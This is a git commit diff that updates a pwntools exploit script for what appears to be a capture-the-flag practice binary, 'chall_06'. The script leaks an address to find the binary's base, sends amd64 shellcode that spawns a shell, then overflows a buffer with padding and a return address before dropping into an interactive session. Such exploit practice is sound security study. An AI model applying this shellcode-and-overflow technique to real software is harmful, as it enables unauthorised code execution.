f67371f698dc412e358295750ae3fc5466b8e153
marwane <marwane@udel.edu>
2021-04-13 17:48:21 -0400

    pushed chall 6

--- chall_06.py
+++ chall_06.py
@@ -1,22 +1,27 @@
 from pwn import *
-
 p = process ("./chall_06")
-
 context.arch = "amd64" 
-p.recv()
-p.sendline("andyrulz")
+elf = ELF("./chall_06") 
+
+
 resp = p.recv()
 resp
+
 import re
 streeng = re.findall(b"([a-f0-9]{8,16})",resp)[0]
-streeng
-shellcodeAddr = p64(int(re.findall(b"([a-f0-9]{8,16})",resp)[0],16))
+main = int(streeng ,16)
+elf.address = main - elf.sym.main
+
+payload = b''
+shellcode = asm(shellcraft.amd64.sh())
+payload += shellcode
+p.sendline(payload)
 
 payload = b''
 payload+= (0x48-0x10) * b'A' 
-elf = ELF("./chall_06") 
-payload += p64(elf.sym.win)
+payload += p64(main)
 
+p.recv()
 p.sendline(payload)
 
 p.interactive()
